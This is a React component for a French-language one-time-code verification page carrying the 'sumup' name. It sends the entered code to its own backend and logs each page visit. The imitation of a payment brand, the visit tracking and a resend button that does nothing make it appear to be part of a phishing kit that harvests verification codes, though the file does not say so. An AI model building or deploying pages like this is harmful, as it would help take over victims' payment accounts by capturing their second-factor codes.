import { useState, useEffect } from "react";
import { Link, useLocation } from "wouter";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";

export default function OtpVerification() {
  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  useEffect(() => {
    // Track visitor when page loads
    apiRequest("POST", "/api/track-visit", { page: "OTP Verification Page" }).catch(() => {
      // Silent fail - tracking shouldn't break the app
    });
  }, []);

  const handleVerifyOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const response = await apiRequest("POST", "/api/verify-otp", { otp });
      const data = await response.json();

      if (data.success) {
        toast({
          title: "Verification successful!",
          description: "OTP code has been verified.",
        });
        
        setOtp("");
        
        // Redirect to home after successful verification
        setTimeout(() => {
          setLocation("/");
        }, 1500);
      }
    } catch (error: any) {
      toast({
        title: "Verification failed",
        description: error.message || "Please try again",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(value);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-white px-4">
      <div className="w-full max-w-md">
        <Link href="/" className="mb-12 flex items-center hover:opacity-80 transition-opacity" data-testid="link-home">
          <div className="h-8 w-8 bg-black rounded-md flex items-center justify-center" data-testid="logo-icon">
            <svg viewBox="0 0 24 24" fill="white" className="h-5 w-5">
              <path d="M13 10V3L4 14h7v7l9-11h-7z" />
            </svg>
          </div>
          <span className="ml-2 text-lg font-semibold" data-testid="logo-text">sumup</span>
        </Link>

        <h1 className="text-4xl font-bold mb-4 text-black" data-testid="text-title">
          Vérification
        </h1>
        
        <p className="text-gray-600 mb-12" data-testid="text-description">
          Entrez le code de vérification envoyé à votre adresse e-mail
        </p>

        <form onSubmit={handleVerifyOtp} className="space-y-6">
          <div>
            <label 
              htmlFor="otp" 
              className="block text-sm font-medium mb-2 text-black"
              data-testid="label-otp"
            >
              Code de vérification
            </label>
            <input
              id="otp"
              type="text"
              value={otp}
              onChange={handleOtpChange}
              placeholder="000000"
              inputMode="numeric"
              required
              maxLength={6}
              className="w-full h-12 px-4 border border-black rounded-md focus:outline-none focus:ring-2 focus:ring-black text-black text-center text-2xl tracking-widest placeholder:text-gray-400"
              data-testid="input-otp"
            />
          </div>

          <button
            type="submit"
            disabled={isLoading || otp.length !== 6}
            className="w-full h-12 bg-black text-white font-semibold rounded-md hover:bg-opacity-90 disabled:bg-opacity-50 transition-all"
            data-testid="button-verify"
          >
            {isLoading ? "Vérification..." : "Vérifier"}
          </button>
        </form>

        <div className="mt-6 text-center">
          <button
            type="button"
            className="text-sm font-medium text-black underline hover:no-underline"
            data-testid="button-resend"
          >
            Renvoyer le code
          </button>
        </div>

        <div className="mt-8">
          <Link href="/login">
            <button
              type="button"
              className="w-full h-12 border border-black text-black font-medium rounded-md hover:bg-gray-50 transition-all"
              data-testid="button-back-login"
            >
              Retour à la connexion
            </button>
          </Link>
        </div>
      </div>
    </div>
  );
}
